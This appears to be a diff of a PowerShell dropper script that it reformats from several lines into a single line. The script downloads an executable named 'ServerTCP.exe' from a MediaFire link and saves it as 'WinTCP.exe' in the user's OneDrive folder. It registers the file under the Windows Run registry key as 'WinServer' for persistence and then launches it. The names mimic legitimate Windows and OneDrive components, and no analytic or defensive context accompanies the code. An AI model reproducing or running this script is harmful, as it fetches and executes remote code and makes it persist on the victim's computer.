@@ -1,8 +1,1 @@
-$Dir1 = "C:\Users\";
-$NameU = $env:USERNAME;
-$Dir2 = "\AppData\Local\Microsoft\OneDrive";
-$Cam1 = $Dir1 + $NameU + $Dir2;
-$Cam2 = $Cam1 + "WinTCP.exe";
-cd $Cam1;
-Invoke-WebRequest -Uri 'https://download1583.mediafire.com/hws2r5u8i8ggqU-SHDZ9vYpZQO0clBWFqS9i1oKr2fyGPWLmBdoyBOTuuAekH6Y1vmeZZNxa7H4KMyvgA6d9zoPgyPEV9D00FHBYp-UcLGr6WuSJDIu0nD9oh1CFnBierAs1R_y_EB7VOwmG-pVbN54hK11qe3dLi6tpvHkkm4dt8Ws/b8jaxzz0jz9022f/ServerTCP.exe' -OutFile WinTCP.exe;
-New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'WinServer' -Value $Cam2; Start WinTCP.exe; exit
+$Dir1 = "C:\Users\"; $NameU = $env:USERNAME; $Dir2 = "\AppData\Local\Microsoft\OneDrive"; $Cam1 = $Dir1 + $NameU + $Dir2; $Cam2 = $Cam1 + "WinTCP.exe"; cd $Cam1; Invoke-WebRequest -Uri 'https://download1583.mediafire.com/hws2r5u8i8ggqU-SHDZ9vYpZQO0clBWFqS9i1oKr2fyGPWLmBdoyBOTuuAekH6Y1vmeZZNxa7H4KMyvgA6d9zoPgyPEV9D00FHBYp-UcLGr6WuSJDIu0nD9oh1CFnBierAs1R_y_EB7VOwmG-pVbN54hK11qe3dLi6tpvHkkm4dt8Ws/b8jaxzz0jz9022f/ServerTCP.exe' -OutFile WinTCP.exe; New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'WinServer' -Value $Cam2; Start WinTCP.exe; exit
